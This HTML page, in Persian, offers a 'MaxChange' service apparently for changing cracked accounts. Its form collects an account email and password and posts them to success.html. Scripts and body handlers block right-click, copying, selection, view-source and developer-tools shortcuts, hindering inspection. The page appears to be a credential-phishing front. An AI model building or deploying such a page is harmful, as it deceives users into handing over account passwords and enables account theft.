<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>MaxChange - PWA</title>
  <link rel="shortcut icon" href="Screenshot_20250826_154108_Chrome.jpg" type="image/x-icon">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@500&display=swap');

    * {
      box-sizing: border-box;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin:0;
      height:100vh;
      display:flex;
      flex-direction:column;
      justify-content:center;
      align-items:center;
      font-family:'Vazirmatn',sans-serif;
      overflow:hidden;
      background:linear-gradient(-45deg,#0f0c29,#302b63,#24243e,#1a1a2e);
      background-size:400% 400%;
      animation:gradientMove 15s ease infinite;
    }

    @keyframes gradientMove {
      0% {background-position:0% 50%}
      50% {background-position:100% 50%}
      100% {background-position:0% 50%}
    }

    h2 {
      font-family:'Orbitron',sans-serif;
      margin:0 0 18px;
      color:#00fff7;
      text-shadow:0 0 8px #00fff7,0 0 20px #ff00c8;
      pointer-events:none;
    }

    .card {
      width:90%;
      max-width:360px;
      background:rgba(255,255,255,.06);
      border:1px solid rgba(255,255,255,.08);
      border-radius:16px;
      padding:18px 18px 14px;
      backdrop-filter:blur(6px);
      box-shadow:0 8px 28px rgba(0,0,0,.4);
      text-align:center;
      color:#e8ffff;
    }

    label {
      display:block;
      text-align:right;
      font-size:13px;
      color:#cfeff0;
      margin:10px 4px 6px;
      pointer-events:none;
    }

    input {
      width:100%;
      padding:12px;
      border-radius:12px;
      border:1px solid rgba(255,255,255,.12);
      background:rgba(0,0,0,.45);
      color:#fff;
      outline:none;
      transition:.2s;
    }
    input:focus {
      border-color:rgba(0,255,247,.6);
      box-shadow:0 0 12px rgba(0,255,247,.15);
    }

    .btn {
      width:100%;
      padding:12px;
      margin-top:14px;
      border:none;
      border-radius:12px;
      background:linear-gradient(135deg,#ff00c8,#00fff7);
      color:#061017;
      font-weight:700;
      cursor:pointer;
      transition:.25s;
      text-transform:uppercase;
      -webkit-tap-highlight-color: transparent;
    }
    .btn:hover {
      transform:translateY(-1px);
      box-shadow:0 0 14px rgba(0,255,247,.25);
    }

    .back {
      display:inline-block;
      margin-top:12px;
      font-size:12px;
      color:#cfeff0;
      text-decoration:none;
      opacity:.8;
      pointer-events:none;
    }
  </style>
</head>
<body 
  oncontextmenu="return false" 
  oncopy="return false" 
  oncut="return false" 
  onpaste="return false" 
  onselectstart="return false"
>
  <div class="card">
    <h2>چنح اکانت کرکی</h2>
    <form action="success.html" method="post" autocomplete="off">
      <label for="email">ایمیل اکانت</label>
      <input id="email" name="email" type="email" placeholder="example@gmail.com" required>

      <label for="pass">رمز عبور</label>
      <input id="pass" name="pass" type="password" placeholder="••••••••" required>

      <button class="btn" type="submit">ادامه</button>
    </form>
  </div>

  <script>
    // جلوگیری از کلیدهای میانبر مرورگر
    document.addEventListener("keydown", function(e) {
      if ((e.ctrlKey && ["u","U","s","S","c","C"].includes(e.key)) || e.key === "F12") {
        e.preventDefault();
        return false;
      }
    });
  </script>
</body>
</html>
